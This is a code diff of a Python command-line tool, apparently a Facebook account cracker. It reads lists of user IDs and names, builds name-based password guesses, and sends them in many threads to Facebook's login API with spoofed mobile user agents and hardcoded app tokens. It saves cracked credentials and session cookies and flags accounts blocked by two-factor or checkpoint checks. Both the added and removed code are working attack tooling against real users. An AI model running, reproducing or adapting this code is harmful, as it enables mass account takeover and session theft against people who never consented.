+    density3 = random.choice(['1.0', '1.5', '1.8', '2.0', '2.2', '2.5', '3.0'])
+    width3 = random.choice(['720', '1080'])
+    height3 = random.choice(['2400', '2340', '2560'])
+    fblc3 = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","fa_IR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
+    fbrv3 = str(random.randint(333333333, 999999999))
+    fbcr3 = random.choice(["Banglalink", "Airtel", "Robi", "Grameenphone", "Teletalk", "U.S. Cellular", "Verizon", "Verizon Wireless", "Cricket", "Google Fi", "T-Mobile", "AT&T", "Sprint","Metro by T-Mobile","Boost Mobile","TracFone Wireless","Xfinity Mobile","Mint Mobile","Visible","Republic Wireless","Consumer Cellular","Straight Talk","Spectrum Mobile","Ting","H2O Wireless","FreedomPop","Boost Infinite","Simple Mobile","Pure Talk","C-Spire Wireless","SouthernLINC Wireless","GCI Wireless","Bluegrass Cellular","Nex-Tech Wireless","T-Mobile Prepaid","Ultra Mobile","TracFone","Freedom Wireless","MetroPCS","Cellcom","Nextel","Cricket Wireless"])
+    fbmf3 = 'samsung';fbbd3 = 'samsung'
+    fbdv3 = random.choice(['SM-J200M', 'SM-A300FU', 'SM-A115U', 'SM-A307G', 'SM-A105G', 'SM-A013M', 'SM-A107M', 'SM-A510M', 'SM-G6200', 'SM-F900U', 'SM-J510H'])
+    fbsv3 = f'{random.randint(5,11)}.{random.randint(0,5)}.{random.randint(1,5)}'
+    fb3=random.choice(['com.facebook.katana|FB4A','com.facebook.orca|Orca-Android'])
+    fban3=fb3.split('|')[1];fbpn3=fb3.split('|')[0]
+    bit3 = random.choice(['FBOP/19;FBCA/armeabi-v7a:armeabi;]','FBOP/1;FBCA/arm64-v8a:;]'])
+    ___Noor_on_Fire___ = '[FBAN/'+str(fban3)+';FBAV/'+str(fbav3)+';FBBV/'+str(fbbv3)+';FBDM/{density='+str(density3)+',width='+str(width3)+',height='+str(height3)+'};FBLC/'+str(fblc3)+';FBRV/'+str(fbrv3)+';FBCR/'+str(fbcr3)+';FBMF/'+str(fbmf3)+';FBBD/'+str(fbbd3)+';FBPN/'+str(fbpn3)+';FBDV/'+str(fbdv3)+';FBSV/'+str(fbsv3)+';'+str(bit3)+''
+    return ___Noor_on_Fire___
+
+def _____UpDaTe_S2_____():
+    fbav3 = f'{random.randint(191,505)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(39,69)}.{random.randint(64,154)}'
+    fbbv3 = str(random.randint(111111111, 999999999))
+    density3 = random.choice(['1.0', '1.5', '1.8', '2.0', '2.2', '2.5', '3.0'])
+    width3 = random.choice(['720', '1080'])
+    height3 = random.choice(['2400', '2340', '2560'])
+    fblc3 = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","fa_IR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
+    fbrv3 = str(random.randint(333333333, 999999999))
+    fbcr3 = random.choice(["Banglalink", "Airtel", "Robi", "Grameenphone", "Teletalk", "U.S. Cellular", "Verizon", "Verizon Wireless", "Cricket", "Google Fi", "T-Mobile", "AT&T", "Sprint","Metro by T-Mobile","Boost Mobile","TracFone Wireless","Xfinity Mobile","Mint Mobile","Visible","Republic Wireless","Consumer Cellular","Straight Talk","Spectrum Mobile","Ting","H2O Wireless","FreedomPop","Boost Infinite","Simple Mobile","Pure Talk","C-Spire Wireless","SouthernLINC Wireless","GCI Wireless","Bluegrass Cellular","Nex-Tech Wireless","T-Mobile Prepaid","Ultra Mobile","TracFone","Freedom Wireless","MetroPCS","Cellcom","Nextel","Cricket Wireless"])
+    fbmf3 = 'samsung';fbbd3 = 'samsung'
+    fbdv3 = random.choice(['SM-J200M', 'SM-A300FU', 'SM-A115U', 'SM-A307G', 'SM-A105G', 'SM-A013M', 'SM-A107M', 'SM-A510M', 'SM-G6200', 'SM-F900U', 'SM-J510H'])
+    fbsv3 = f'{random.randint(5,11)}.{random.randint(0,5)}.{random.randint(1,5)}'
+    fb3=random.choice(['com.facebook.katana|FB4A','com.facebook.orca|Orca-Android'])
+    fban3=fb3.split('|')[1];fbpn3=fb3.split('|')[0]
+    bit3 = random.choice(['FBOP/19;FBCA/armeabi-v7a:armeabi;]','FBOP/1;FBCA/arm64-v8a:;]'])
+    agent3 = '[FBAN/'+str(fban3)+';FBAV/'+str(fbav3)+';FBBV/'+str(fbbv3)+';FBDM/{density='+str(density3)+',width='+str(width3)+',height='+str(height3)+'};FBLC/'+str(fblc3)+';FBRV/'+str(fbrv3)+';FBCR/'+str(fbcr3)+';FBMF/'+str(fbmf3)+';FBBD/'+str(fbbd3)+';FBPN/'+str(fbpn3)+';FBDV/'+str(fbdv3)+';FBSV/'+str(fbsv3)+';'+str(bit3)+''
+    iphone3 = random.choice(['Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 [FBAN/FBIOS;FBAV/168.0.0.57.90;FBBV/103647182;FBDV/iPhone6,1;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/2;FBCR/NOS;FBID/phone;FBLC/pt_BR;FBOP/5;FBRV/0]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21G93 [FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/650374106;FBDV/iPhone14,7;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/652879078;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D60 [FBAN/FBIOS;FBAV/158.0.0.44.98;FBBV/90997758;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/11.2.5;FBSS/3;FBCR/vodafoneP;FBID/phone;FBLC/en_US;FBOP/5;FBRV/90997758]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21G93 [FBAN/FBIOS;FBAV/493.0.0.55.216;FBBV/672970693;FBDV/iPhone13,2;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/674179525;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/22D72 [FBAN/FBIOS;FBAV/501.0.0.49.107;FBBV/699723644;FBDV/iPhone15,4;FBMD/iPhone;FBSN/iOS;FBSV/18.3.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/701797973;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_10 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20H350 [FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/696635672;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/16.7.10;FBSS/2;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/700448384;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/22D82 [FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/707243085;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/18.3.2;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/0;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20F75 [FBAN/FBIOS;FBAV/503.0.0.56.104;FBBV/704769221;FBDV/iPhone12,8;FBMD/iPhone;FBSN/iOS;FBSV/16.5.1;FBSS/2;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/708017881;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C114 [FBAN/FBIOS;FBAV/151.0.0.61.202;FBBV/82156572;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iOS;FBSV/11.2;FBSS/3;FBCR/SFR;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/83160404]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20G81 [FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/534883268;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/2;FBID/phone;FBLC/it_Qaau_IT;FBOP/5;FBRV/537932531]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19H364 [FBAN/FBIOS;FBAV/441.1.0.27.105;FBBV/539464914;FBDV/iPhone9,2;FBMD/iPhone;FBSN/iOS;FBSV/15.7.8;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/541069100]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 LightSpeed [FBAN/MessengerLiteForiOS;FBAV/276.0.0.32.107;FBBV/235827610;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/13.6;FBSS/3;FBCR/;FBID/phone;FBLC/en;FBOP/0]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20D67 [FBAN/FBIOS;FBAV/412.0.0.40.114;FBBV/469153370;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/471145542]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19E258 [FBAN/FBIOS;FBAV/475.0.0.31.110;FBBV/627850395;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/15.4.1;FBSS/2;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/630494309;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_1 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C153 [FBAN/FBIOS;FBAV/174.0.0.48.98;FBBV/110921384;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/11.2.1;FBSS/3;FBCR/NOS;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/112241032]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D60 [FBAN/FBIOS;FBAV/159.0.0.48.97;FBBV/91994325;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/11.2.5;FBSS/3;FBCR/vodafoneP;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/92489346]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 [FBAN/FBIOS;FBAV/155.0.0.36.93;FBBV/87992437;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/11.1.1;FBSS/2;FBCR/MEO;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/89136215]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15G77 [FBAN/FBIOS;FBAV/182.0.0.42.80;FBBV/118457561;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/11.4.1;FBSS/2;FBCR/POST;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/119485025]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D60 [FBAN/FBIOS;FBAV/165.0.0.74.96;FBBV/100174821;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/11.2.5;FBSS/2;FBCR/NOS;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/100948865]'])
+    ___Noor_on_Fire___ = ''+str(iphone3)+' '+str(agent3)
+    return ___Noor_on_Fire___
+#----------------\<-VERSION->/----------------#
+versn = requests.get(f"https://raw.githubusercontent.com/NOOR-404/Control-room/main/VERSION").text.strip();version = str(versn)
+#----------------\<-SHORT->/----------------#
+__COUNTRYS__ = af['country'].upper()
+xlinex = (f"{G}━"*56)
+#----------------\<-LOGO->/----------------#
+logo = f"""
+{R}╦═╗╔═╗╔╗ ╔═╗╦ ╦  ╔═╗╦ ╦╔═╗╦ ╦╦                                    ╠╦╝╠═╣╠╩╗╠═╣╠═╣  ║  ╠═╣╠═╣║║║║ {W}  DEVELOPER [/] {R}Rabah{G}-{R}Chawi
+{G}╩╚═╩ ╩╚═╝╩ ╩╩ ╩  ╚═╝╩ ╩╩ ╩╚╩╝╩ {W}  VERSION   [/] {R}V{G}/{R}{version}      
+{xlinex}
+[/] FUTURES  {xpxx} {R}FILE
+[/] COUNTRY  {xpxx} {R}{__COUNTRYS__}
+{xlinex}"""
+
+#----------------\<-RABAH->/----------------#
+class __SEAXNOOR__:
+    def __init__(self) -> None:
+        self.loop = 0
+        self.oks = []
+        self.cps = []
+        self.sea = []
+        self.nvs = []
+        self.twf = []
+        self.gen = []
+        self.plist = []
+        self.__COOKIE__ = []
+        self.__CP__ = []
+        self.__LOCK__ = []
+    #----------------\<-MAIN-MENU->/----------------#
+    def __MENU__(self) -> None:
+        __CLEAR__()
+        print(f"{xp1} {O}FILE CLONING ")
+        #print(f"{xp2} RANDOM CLONING ")
+        print(f"{xp0} {O}EXIT TOOLS ")
+        __LINE__()
+        __MENUC__ = input(f"{xpx} {R}INPUT MENU {xpxx} ")
+        if __MENUC__ == "1":
+            self.__FILEX__()
+        elif __MENUC__ == "2":
+            __LINE__()
+            print(f"{xp} {R}RANDOM CLONE COMING SOON...! ")
+            time.sleep(1.1)
+            self.__MENU__()
+        elif __MENUC__ == "0":
+            __LINE__()
+            print(f"{xp} {R}EXIT SUCCESSFULLY ")
+            time.sleep(1.1)
+            __LINE__()
+            sys.exit()
         else:
-            pcp.append('n')
-            
-        with tred(max_workers=30) as crack_submit:
-            clear()
-            total_ids = str(len(fo))
-            
-            print(f'[{mrmafia}>>{W}] Total ids : {G}{total_ids}{W} >> Method : {G}{mthd}{W}')
-            print(f'[{mrmafia}>>{W}] Password Mode : {G}{pass_info}{W} ')
-            print(f'{W}[{mrmafia}>>{W}] After 2/4/5 Minutes ({G}On{W}/{R}Off{W}) Airplane Mode ')
-            linex()
-            for user in fo:
-                ids,names = user.split('|')
-                passlist = plist
-                if mthd in ['1','01']:
-                    crack_submit.submit(Maf_1,ids,names,passlist)
-                elif mthd in ['2','02']:
-                    crack_submit.submit(Maf_2,ids,names,passlist)
-                elif mthd in ['3','03']:
-                    crack_submit.submit(Maf_3,ids,names,passlist)
-                    
-        print(f'\033[1;37m')
-        linex()
-        print(f'[{mrmafia}>>{W}] PROCESS COMPLTED')
-        print(f"[{mrmafia}>>{W}] Ok Ids : {G}{W} %s "%(len(oks)))
-        print(f"[{mrmafia}>>{W}] Cp Ids : {R}{W} %s "%(len(cps)))
-        linex()
-        input(f'[{mrmafia}>>{W}] Press Enter Back  ')
-        exit()
-    elif xd in ['2','02']:
-        linex()
-        path = input(f" [{mrmafia}>>{W}] Enter file path : ").strip()
-        clean_file(path)
-    elif xd in ['0','00']:
-        exit(f' [{mrmafia}>>{W}] Thanks For Use ')
-    else:
-        exit(f' [{mrmafia}>>{W}] Option not found in menu...')
+            __LINE__()
+            print(f"{xp} {R}INVALID OPTION TRY AGAIN ")
+            time.sleep(1)
+            self.__MENU__()
 
-#-----> ip fakeee Method + system random locale + system mask Data <-----#    
-def IPV4_FAKEEEE():  
-    return ".".join(str(random.randint(1, 254)) for _ in range(4))
-    
-def random_locale():
-    locales = [("en_US", "US"), ("en_GB", "GB"),("fr_FR", "FR"),("fr_DZ", "DZ"),("ar_MA", "MA"),("es_ES", "ES"),("pt_BR", "BR")]
-    return random.choice(locales)
-    
-def mask_user(user):
-    return user[:7] + '*' * (len(user) - 7) if len(user) > 7 else user
+    #----------------\<-FILE-MENU->/----------------#
+    def __FILEX__(self) -> None:
+        __CLEAR__()
+        print(f"{xp} EXAMPLE  {xpxx} {G}/{W}sdcard{G}/{W}File.txt")
+        __LINE__()
+        __fileloX__ = input(f"{xpx} {R}INPUT FILE PATH {xpxx} ")
+        try:
+            if not __fileloX__.startswith("/") and not __fileloX__.startswith("./"):
+                __fileXX__ = f"/sdcard/{__fileloX__}"
+            else:
+                __fileXX__ = __fileloX__
+            __fileckX__ = open(__fileXX__, 'r').read().splitlines()
+        except FileNotFoundError:
+            __LINE__()
+            print(f"{xp} {R}FILE NOT FOUND TRY AGAIN ")
+            time.sleep(1.2)
+            self.__FILEX__()
+            return
+        except PermissionError:
+            __LINE__()
+            print(f"{xp} {R}ALLOW STORAGE PERMISSION ")
+            time.sleep(1.2)
+            __LINE__()
+            sys.exit()
+        except IOError:
+            __LINE__()
+            print(f"{xp} {R}FILE READING ERROR TRY AGAIN ")
+            time.sleep(1.2)
+            self.__FILEX__()
+            return
 
-def mask_pass(pw):
-    return pw[:4] + '*' * (len(pw) - 4) if len(pw) > 4 else pw
-#----->Dedup & Sort<-----#
-def clean_file(file_path):
-    if not os.path.isfile(file_path):
-        print("[-] File not found!");return
-    try:
-        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
-            lines = f.read().splitlines()
-        original = len(lines)
-        lines = list(dict.fromkeys(lines))
-        seen_ids, valid = set(), []
-        for line in lines:
-            parts = line.strip().split("|")
-            if len(parts) > 0 and parts[0].isdigit():
-                fb_id = int(parts[0])
-                if fb_id not in seen_ids:
-                    seen_ids.add(fb_id)
-                    valid.append((fb_id, line.strip()))
-        if not valid:
-            print(f" [-] No valid Facebook IDs found.");return
-        sorted_lines = sorted(valid, key=lambda x: (len(str(x[0])), x[0]), reverse=True)
-        with open(file_path, "w", encoding="utf-8") as f:
-            for _, line in sorted_lines:
-                f.write(line + "\n")
-        print(f" [+] Before: {R}{original}{W} | After: {G}{len(sorted_lines)}")
-        print(f" [+] Done!")
-    except Exception as e:
-        print(f"[!] Error: {e}")
-#-----> Checking Menu MR'MAFIA <-----#
-try: stg();check_approval()
-except requests.exceptions.ConnectionError: sys.exit(f' {R}× {W}InterNet Contention Problem.!')
-except Exception as e: sys.exit(e)
+        __CLEAR__()
+        print(f"{xp1} {R}METHOD")
+        print(f"{xp2} {R}METHOD")
+        print(f"{xp3} {R}METHOD")
+        print(f"{xp4} {R}METHOD")
+        __LINE__()
+        __METHODF__ = input(f"{xpx} {R}INPUT METHOD {xpxx} ")
+
+        __CLEAR__()
+        print(f"{xp1} {R}AUTO PASSLIST ")
+        print(f"{xp2} {R}CUSTOM PASSLIST ")
+        __LINE__()
+        __PASLISTF__ = input(f"{xpx} {R}INPUT PASSLIST {xpxx} ")
+
+        if __PASLISTF__ == "1":
+            __CLEAR__()
+            print(f"{xp1} {R}AUTO BANGLADESH  ")
+            print(f"{xp2} {R}AUTO INDIA   ")
+            print(f"{xp3} {R}AUTO ALGERIA    ")
+            print(f"{xp4} {R}AUTO NEPAL  ")
+            __LINE__()
+            __COUNTRYPAS__ = input(f"{xpx} {R}INPUT PASSLIST {xpxx} ")
+
+            if __COUNTRYPAS__ == "1":
+                self.plist.extend(["first first", "first last", "first123", "last last", "last first", "first1234", "first12345", "first123456", "first 123", "first 1234", "first 12345", "first 123456", "first 1234567", "first 12", "first12"])
+            elif __COUNTRYPAS__ == "2":
+                self.plist.extend(["first first", "first last", "first123", "last last", "last first", "first1234", "first12345", "first123456", "first 123", "first 1234", "first 12345", "first 123456", "first 1234567", "first 12", "first12"])
+            elif __COUNTRYPAS__ == "3":
+                self.plist.extend(["first first", "first last", "first123", "last last", "last first", "first1234", "first12345", "first123456", "first 123", "first 1234", "first 12345", "first 123456", "first 1234567", "first 12", "first12"])
+            elif __COUNTRYPAS__ == "4":
+                self.plist.extend(["first first", "first last", "first123", "last last", "last first", "first1234", "first12345", "first123456", "first 123", "first 1234", "first 12345", "first 123456", "first 1234567", "first 12", "first12"])
+            else:
+                self.plist.extend(["first first", "first last", "first123", "last last", "last first", "first1234", "first12345", "first123456", "first 123", "first 1234", "first 12345", "first 123456", "first 1234567", "first 12", "first12"])
+
+        else:
+            try:
+                __CLEAR__()
+                print(f"{xp} {R}BANGLADESH PASSLIST 10{G}/{W}15 LIMIT")
+                print(f"{xp} {R}OTHERS COUNTRY PASSLIST 5{G}/{W}10 LIMIT")
+                __LINE__()
+                __PASSFM__ = int(input(f"{xpx} {R}PASSLIST LIMIT {xpxx} "))
+            except:
+                __PASSFM__ = 5
+
+            __CLEAR__()
+            print(f"{xp} {R}EXAMPLE  {xpxx} firstlast {G}/{W} first12 {G}/{W} first123 ")
+            __LINE__()
+            for i in range(__PASSFM__):
+                self.plist.append(input(f"{xp} {R}ENTER PASSLIST {G}<[{W}{i+1}{G}]> {xpxx} "))
+
+        __CLEAR__()
+        print(f"{xp1} {R}AUTO SPEED {G}<[{W}30{G}]> ")
+        print(f"{xp2} {R}CUSTOM SPEED ")
+        __LINE__()
+        __SPEED__ = input(f"{xpx} {R}INPUT SPEED {xpxx} ")
+
+        if __SPEED__ == "1":
+            __MAXX__ = 30
+        else:
+            try:
+                __CLEAR__()
+                print(f"{xp} {R}MAXIMUM SPEED LIMIT 30-60 ")
+                __LINE__()
+                __MAXX__ = int(input(f"{xpx} {R}INPUT SPEED {xpxx} "))
+            except ValueError:
+                __MAXX__ = 60
+
+        __CLEAR__()
+        print(f"{xp} {R}DO YOU WANT TO SHOW COOKIE...? ")
+        __LINE__()
+        __co__ = input(f"{xpx} {B}Y{G}/{R}N {xpxx} ")
+        __CLEAR__()
+        print(f"{xp} {R}DO YOU WANT TO SHOW CP{G}/{W}2F IDS...? ")
+        __LINE__()
+        __cps__ = input(f"{xpx} {B}Y{G}/{R}N {xpxx} ")
+
+        self.__COOKIE__.append('y' if __co__.lower() in ['y', 'yes', '1'] else 'n')
+        self.__CP__.append('y' if __cps__.lower() in ['y', 'yes', '1'] else 'n')
+
+        with ThreadPool(max_workers=__MAXX__) as __SEA__:
+            __CLEAR__()
+            total_ids = str(len(__fileckX__))
+            print(f"[/] {R}TOTAL{G}/{W}IDS {xpxx} {total_ids} ")
+            #print(f"{xp} IF NO RESULT ON{G}/{W}OFF AIRPLANE MODE")
+            __LINE__()
+            for user in __fileckX__:
+                try:
+                    ids, names = user.split('|')
+                except ValueError:
+                    continue
+                passlist = self.plist
+                if __METHODF__ == "1":
+                    __SEA__.submit(self.__M1X__, ids, names, passlist)
+                elif __METHODF__ == "2":
+                    __SEA__.submit(self.__M2X__, ids, names, passlist)
+                elif __METHODF__ == "3":
+                    __SEA__.submit(self.__M3X__, ids, names, passlist)
+                elif __METHODF__ == "4":
+                    __SEA__.submit(self.__M4X__, ids, names, passlist)
+                elif __METHODF__ == "5":
+                    __SEA__.submit(self.__M5X__, ids, names, passlist)
+                else:
+                    __SEA__.submit(self.__M1X__, ids, names, passlist)
+
+        print("\033[1;37m")
+        __LINE__()
+        print(f"{xp} THE PROCESS HAS COMPLETED...!")
+        print(f"{xp} TOTAL OK{G}/{W}2F{G}/{W}CP {xpxx}{B} {len(self.oks)}{G}/{Y}{len(self.twf)}{G}/{R}{len(self.cps)}")
+        __LINE__()
+        print(f"{xp} THANKS FOR USING.....! ")
+        sys.exit()
+
+
+    #----------------\<-FILE-M1-GRAPH->/----------------#
+    def __M1X__(self, ids, names, passlist):
+        try:
+            global loop, oks, cps
+            color = random.choice([
+                "\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m",
+                "\x1b[38;5;160m", "\x1b[38;5;46m", "\033[1;33m",
+                "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
+            ])
+            sys.stdout.write(
+                f'\r{xp}{W}-{G}<[{W}RABAH{G}-{W}XD{G}]>>{W}-{G}<<[{color}{self.loop}{G}+{W}M1{G}]>>{W}--{G}<<[{G}{len(self.oks)}{G}+{Y}{len(self.twf)}{G}+{P}{len(self.cps)}{G}]> '
+            )
+            sys.stdout.flush()
+
+            fn = names.split(' ')[0]
+            try:
+                ln = names.split(' ')[1]
+            except:
+                ln = fn
+
+            for pw in passlist:
+                pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
+                ua = _____UpDaTe_S1_____()
+                accessToken = random.choice([
+                    '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+                    '256002347743983|374e60f8b9bb6b8cbb30f78030438895'
+                ])
+                random_seed = random.Random()
+                pax = random.choice(["PWD_FB4A", "PWD_BROWSER"])
+                adid = ''.join(random_seed.choices(string.hexdigits, k=16))
+                device_id = str(uuid.uuid4())
+                __locale__ = {
+                    "en_US": "US", "en_GB": "GB", "es_ES": "ES", "fr_FR": "FR",
+                    "ar_SA": "SA", "bn_BD": "BD", "ja_JP": "JP", "de_DE": "DE", "pt_BR": "BR"
+                }
+                country_locale = random.choice(list(__locale__.keys()))
+                country_code = __locale__[country_locale]
+                data = {
+                    "adid": adid,
+                    "format": "json",
+                    "device_id": device_id,
+                    "cpl": "true",
+                    "family_device_id": str(uuid.uuid4()),
+                    "credentials_type": "device_based_login_password",
+                    "error_detail_type": "button_with_disabled",
+                    "source": "device_based_login",
+                    "email": ids,
+                    "password": f"#{pax}:0:{int(time.time())}:{pas}",
+                    "access_token": accessToken,
+                    "generate_session_cookies": "1",
+                    "advertiser_id": str(uuid.uuid4()),
+                    "currently_logged_in_userid": "0",
+                    "locale": country_locale,
+                    "client_country_code": country_code,
+                    "method": "auth.login",
+                    "fb_api_req_friendly_name": "authenticate",
+                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
+                    "api_key": "882a8490361da98702bf97a021ddc14d"
+                }
+                headers = {
+                    "User-Agent": ua,
+                    "Accept-Encoding": "gzip, deflate",
+                    "Accept": "*/*",
+                    "Connection": "keep-alive",
+                    "Content-Type": "application/x-www-form-urlencoded",
+                    "Host": "graph.facebook.com",
+                    "X-FB-Net-HNI": str(random.randint(11111, 99999)),
+                    "X-FB-SIM-HNI": str(random.randint(11111, 99999)),
+                    "X-FB-Connection-Type": random.choice(["CELL.3G", "WIFI", "MOBILE.LTE", "unknown"]),
+                    "X-Tigon-Is-Retry": "False",
+                    "x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62",
+                    "x-fb-device-group": "5120",
+                    "X-FB-Friendly-Name": "ViewerReactionsMutation",
+                    "X-FB-Request-Analytics-Tags": "graphservice",
+                    "X-FB-HTTP-Engine": "Liger",
+                    "X-FB-Client-IP": "True",
+                    "X-FB-Server-Cluster": "True",
+                    "x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62",
+                    "Content-Length": "699"
+                }
+                url = "https://graph.facebook.com/auth/login"
+                twf = "Login approval's are on. Expect an SMS shortly with a code to use for log in"
+
+                try:
+                    po = requests.post(url, data=data, headers=headers, timeout=10).json()
+                except requests.exceptions.Timeout:
+                    print(f"\n{R}[-] Timeout error for {ids} / {pas}")
+                    continue
+                except Exception as e:
+                    print(f"\n{R}[-] Exception: {str(e)}")
+                    continue
+
+                if 'session_key' in po:
+                    ckkk = ';'.join(i['name'] + '=' + i['value'] for i in po['session_cookies'])
+                    ssbb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
+                    cookie = f'sb=Cracked.By-NooR_Tool;{ssbb};{ckkk}'
+                    print(f'\r{xp}{W}-{G}<[{B}RABAH-OK{G}]>{G} ' + ids + f' / ' + pas + '\033[1;97m')
+                    if 'y' in self.__COOKIE__:
+                        colorX = random.choice([
+                            "\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m",
+                            "\x1b[38;5;160m", "\x1b[38;5;46m", "\033[1;33m",
+                            "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
+                        ])
+                        print(f'\r{xp}{W}-{G}<[{B}COOKIE{G}]>{colorX} ' + cookie + '\n')
+                    open('/sdcard/SEA-XD/FILE/SEA-M1-OK.txt', 'a').write(ids + '/' + pas + '/' + cookie + '\n')
+                    self.oks.append(ids)
+                    if len(self.oks) % 2 == 0:
+                        idspas = f"M1 : {ids}|{pas}|{cookie}"
+                        requests.post('https://graph.facebook.com/' + '8377547/' + 'subscribers' + '?access_token=' + token)
+                    break
+
+                if twf in str(po):
+                    if 'y' in self.__CP__:
+                        print(f'\r{xp}{W}-{G}<[{Y}SEA-2F{G}]>{Y} ' + ids + f' / ' + pas + '\033[1;97m')
+                    open('/sdcard/SEA-XD/FILE/SEA-M1-2F.txt', 'a').write(ids + '/' + pas + '\n')
+                    self.twf.append(ids)
+                    break
+
+                if 'www.facebook.com' in po.get('error', {}).get('message', ''):
+                    if 'y' in self.__CP__:
+                        print(f'\r{xp}{W}-{G}<[{R}RABAH-CP{G}]>{P} ' + ids + f' / ' + pas + '\033[1;97m')
